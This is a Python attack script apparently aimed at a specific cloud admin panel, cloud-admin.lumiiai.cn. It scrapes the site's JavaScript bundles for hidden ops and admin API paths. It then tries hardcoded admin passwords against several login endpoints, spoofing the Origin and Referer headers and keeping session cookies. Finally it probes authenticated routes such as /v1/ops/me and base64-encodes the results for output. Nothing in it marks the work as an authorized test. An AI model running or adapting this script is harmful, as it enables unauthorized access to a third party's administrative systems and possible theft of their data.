#!/usr/bin/env python3
# i29518 round C: api module mining + /v1/ops/login attempts
import json, base64, subprocess, re, time, os
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
H="cloud-admin.lumiiai.cn"; START=time.time()
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(a,timeout=60):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def http(url,method="GET",body=None,headers=None,timeout=25,maxlen=400000,jar=None):
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}\n__T__%{content_type}"]
    for h in (headers or []): a+=["-H",h]
    if jar: a+=["-b",jar,"-c",jar]
    if body is not None:
        a+=["-X",method,"--data-binary", body if isinstance(body,str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])): a+=["-H","Content-Type: application/json"]
    elif method!="GET": a+=["-X",method]
    a+=[url]
    rc,out,err=run(a,timeout=timeout+15)
    t=out.decode("utf-8","replace"); c=""; ct=""
    m=re.search(r"\n__T__([^\n]*)",t)
    if m: ct=m.group(1); t=t[:m.start()]
    i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"ct":ct,"body":t[:maxlen]}
#---- api module
r=http("https://%s/assets/api-kG82W_fQ.js"%H,timeout=30,maxlen=20000)
R("api_js",r["body"])
r2=http("https://%s/assets/registry-origins-DeduobzZ.js"%H,timeout=20,maxlen=4000)
R("registry_origins",r2["body"])
r3=http("https://%s/assets/x-CjlYjbMs.js"%H,timeout=20,maxlen=4000)
R("x_js",r3["body"])
#---- bundle v1 paths + login context
b=http("https://%s/assets/ops-DK81mX7e.js"%H,timeout=45,maxlen=2000000)["body"]
v1=sorted(set(re.findall(r'["\'`](/v1/[A-Za-z0-9_\-/{}$.:]*)["\'`]',b)))
R("v1_paths",v1[:300])
lg=[]
for m in re.finditer(r'/v1/ops/login',b):
    s=max(0,m.start()-500); e=min(len(b),m.end()+500); lg.append(b[s:e].replace("\n"," "))
R("v1_ops_ctx",lg[:6])
# ops login api calls: search for `v1/ops`
ops=sorted(set(re.findall(r'["\'`]([^"\'`]{0,40}v1/ops[^"\'`]{0,60})["\'`]',b)))
R("v1_ops_lits",ops[:100])
# whoami/me/ops paths
R("ops_any",sorted(set(re.findall(r'["\'`]([^"\'`]{0,60}(?:ops|admin)[^"\'`]{0,60})["\'`]',b)))[:200])
#---- login attempts
jar="/tmp/cj.txt"; 
creds=[("admin","iGIqnu4f8UGepPjBtQRt"),("admin","PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP")]
paths=["/v1/ops/login","/api/v1/ops/login","/ops/login","/api/ops/login"]
hdrs=['Origin: https://cloud-admin.lumiiai.cn','Referer: https://cloud-admin.lumiiai.cn/login','Accept: application/json']
res={}
for p in paths:
    for u,pw in creds:
        for bd in [{"username":u,"password":pw},{"username":u,"password":pw,"account":u},{"account":u,"password":pw}]:
            key=p+"|"+u+"|"+list(bd.keys())[0]
            r=http("https://%s%s"%(H,p),"POST",bd,headers=hdrs,timeout=25,maxlen=3000,jar=jar)
            res[key]={"code":r["code"],"ct":r["ct"],"body":r["body"][:1000]}
            print("login",p,u,list(bd.keys())[0],r["code"],r["body"][:120].replace("\n"," "),flush=True)
R("login",res)
# GET probes for route existence
gp={}
for p in ["/v1/ops/me","/v1/ops/session","/v1/ops/instances","/v1/ops/whoami","/v1/ops/health","/api/v1/ops/me","/api/health","/health","/v1/health","/api/v1/health"]:
    r=http("https://%s%s"%(H,p),timeout=20,maxlen=2000,jar=jar)
    gp[p]={"code":r["code"],"ct":r["ct"],"body":r["body"][:600]}
R("getprobe",gp)
print("DONE",time.time()-START,flush=True)
